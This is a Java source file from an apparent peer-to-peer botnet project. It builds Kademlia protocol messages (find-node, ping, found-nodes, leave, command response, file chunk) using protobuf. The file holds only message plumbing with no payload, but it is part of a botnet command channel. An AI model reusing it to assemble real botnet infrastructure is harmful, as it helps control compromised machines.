package botnet_p2p.protobuf_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.model.Peer;

import java.util.List;
import java.util.stream.Collectors;

import static botnet_p2p.MessageOuterClass.Message;


public class Protobuf {
    public static Message.Builder createBaseMessage(KademliaPeer sender, Peer receiver) {
        Message.Contact senderContact = kademliaPeerToContact(sender);

        Message.Contact receiverContact = Message.Contact.newBuilder()
                //.setGuid(receiver.getGuid()) // TODO peer - no guid
                .setIP(receiver.getAddress())
                //.setIsNAT(false) // TODO
                .setPort(receiver.getPort())
                .build();

        return Message.newBuilder()
                .setSender(senderContact)
                .setReceiver(receiverContact);
    }

    public static Message.Builder createBaseMessage(KademliaPeer sender, KademliaPeer receiver) {
        Message.Contact senderContact = kademliaPeerToContact(sender);
        Message.Contact receiverContact = kademliaPeerToContact(receiver);

        return Message.newBuilder()
                .setSender(senderContact)
                .setReceiver(receiverContact);
    }

    public static Message createFindNodeMessage(Peer bootstrapNode, KademliaPeer me) {
        return createBaseMessage(me, bootstrapNode)
                .setType(Message.MessageType.FIND_NODE)
                .setFindNode(
                        Message.FindNodeMsg.newBuilder()
                                .setGuid(me.getGuid())
                )
                .build();
    }

    public static Message createPingMessage(KademliaPeer destination, KademliaPeer me) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.PING)
                .build();
    }

    public static Message createPingResponseMessage(KademliaPeer destination, KademliaPeer me) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.PING_RESPONSE)
                .build();
    }

    public static Message createFoundNodesMessage(KademliaPeer destination,
                                                  KademliaPeer me,
                                                  List<KademliaPeer> nearestPeers) {

        Message.FoundNodesMsg foundNodes = Message.FoundNodesMsg.newBuilder()
                .addAllNodes(nearestPeers
                        .stream()
                        .map(Protobuf::kademliaPeerToContact)
                        .collect(Collectors.toList())).build();

        return createBaseMessage(me, destination)
                .setType(Message.MessageType.FOUND_NODES)
                .setFoundNodes(foundNodes)
                .build();
    }

    public static Message createLeaveMessage(KademliaPeer sender, KademliaPeer destination) {
        return createBaseMessage(sender, destination)
                .setType(Message.MessageType.LEAVE)
                .build();
    }

    public static Message createCommandReponseMessage(KademliaPeer destination,
                                                      KademliaPeer me,
                                                      String response,
                                                      boolean success) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.RESPONSE)
                .setResponse(
                        Message.ResponseMsg.newBuilder()
                                .setValue(response)
                                .setStatus(success ? Message.Status.OK : Message.Status.FAIL)
                                .build())
                .build();
    }

    public static Message createFileChunkMessage(KademliaPeer destination,
                                                KademliaPeer me,
                                                Message.FileChunkMsg fileChunk) {
        return createBaseMessage(me, destination)
                .setType(Message.MessageType.FILE_CHUNK)
                .setFileChunk(fileChunk)
                .build();
    }

    private static Message.Contact kademliaPeerToContact(KademliaPeer peer) {
        return Message.Contact.newBuilder()
                .setGuid(peer.getGuid())
                .setIP(peer.getHost())
                .setIsNAT(false) // TODO
                .setPort(peer.getPort())
                .build();
    }
}
